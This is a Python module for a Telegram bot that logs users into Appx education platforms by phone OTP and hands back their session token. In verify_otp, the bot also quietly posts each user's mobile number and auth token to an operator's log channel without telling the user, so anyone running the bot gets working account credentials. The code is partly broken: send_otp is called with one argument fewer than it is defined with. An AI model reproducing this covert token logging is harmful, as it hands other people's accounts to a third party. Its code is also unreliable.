import aiohttp
import asyncio
import json
from Extractor import app
from pyrogram import filters
import requests
from config import CHANNEL_ID
log_channel = CHANNEL_ID

@app.on_message(filters.command(["appxotp"]))
async def send_otpp(app, message):
    api = await app.ask(message.chat.id, text="SEND APPX API\n\n✅ Example:\ntcsexamzoneapi.classx.co.in")
    api_txt = api.text
    name = api_txt.split('.')[0].replace("api", "") if api else api_txt.split('.')[0]
    if "api" in api_txt:
        await send_otp(app, message, api_txt)
    else:
        await app.send_message(message.chat.id, "INVALID INPUT IF YOU DONT KNOW API GO TO FIND API OPTION")
        
async def send_otp(app, message, api, name):
    api_base = api if api.startswith(("http://", "https://")) else f"https://{api}"
    input1 = await app.ask(message.chat.id, text="SEND MOBILE NUMBER.")
    mobile = input1.text.strip()
    url = f"{api_base}/get/sendotp?phone={mobile}"
    headers = {
        "Client-Service": "Appx",
        "Auth-Key": "appxapi",
        "source": "website"
    }
    

    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            response_text = await response.text()
            response_json = await response.json()

            if response_json.get("status") == 200:
                await app.send_message(message.chat.id, text = "OTP sent successfully.")
                await verify_otp(app, message, api_base, mobile)
                
                print("OTP sent successfully.")
                return True
            else:
                print("Failed to send OTP:", response_text)
                return False


async def verify_otp(app, message, api_base, mobile):
    
    input2 = await app.ask(message.chat.id, text="enter your otp.")
    otp = input2.text.strip()
    url = f"{api_base}/get/otpverify?useremail={mobile}&otp={otp}&device_id=WebBrowser17267591437616qmd1cxx313&mydeviceid=&mydeviceid2="
    headers = {
        "Client-Service": "Appx",
        "Auth-Key": "appxapi",
        "source": "website"
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            response_text = await response.text()
            response_json = await response.json()

            if response_json.get("status") == 200:
                token = response_json['user']['token']
                dl = (f" Login With {mobile}\n\n Token for {api_base} \n `{token}`")
                print("Token:", token)
                await message.reply_text(f" Token for {api_base}\n\n `{token}`")
                await app.send_message(log_channel, dl)
            else:
                print("Verification failed:", response_json.get('user', 'No user data found'))
                await app.send_message(message.chat.id, text = "your login failed")


    
